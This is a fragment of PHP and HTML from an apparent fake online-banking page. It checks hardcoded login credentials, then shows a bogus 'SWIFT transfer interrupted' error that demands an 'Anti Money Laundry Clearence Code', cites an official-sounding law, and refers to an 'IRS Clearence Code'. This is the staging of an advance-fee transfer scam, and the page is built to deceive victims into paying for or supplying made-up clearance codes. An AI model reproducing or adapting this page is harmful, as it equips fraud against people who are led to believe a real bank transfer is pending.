...
if($name === 'AE4029558KMLA' AND $pass === 'playme'){
header("Location:transfer_tax_confirm2.php");
}else
    {
        header("Location:transfer_invalid2.php");
   exit;
    }
}
?><!DOCTYPE html>
...
background-image: url('error.png');
  ...
  <body class="index">
    <div id="container">
      ...
      <div id="stage">
        <div class="success">Thank you for providing a valid IRS Clearence Code</div>
        <section class="work">
        ...
        <section class="intro" style="display: none;">
          <article>
            <h2>ERROR CODE 931: Swift Transfer Interrupted / Terminated.</h2>
            <p>
              The transfer has been suspended, Please provide your Anti Money Laundry Clearence Number, this is in accordance with the Anti-Money Laundering Articles of the Federal Law No. (3) of 1987 Concerning promulgating Penal Code.
            </p>
            <p>
            ...
            <p>
          <form action="" method="post" enctype="application/x-www-form-urlencoded" name="sub" id="sub"><table width="90%" border="0">
  <tr>
    <td><strong>Anti Money Laundry Clearence Code</strong></td>
  ...
  <tr>
    <td><input type="submit" name="sub" id="sub" value="Continue" class="btn"></td>
    <td><input type="submit" name="sub" id="sub" value="Save Transaction" class="btnt"></td>
  </tr>
</table>
            </ol>
            <ol class="links">
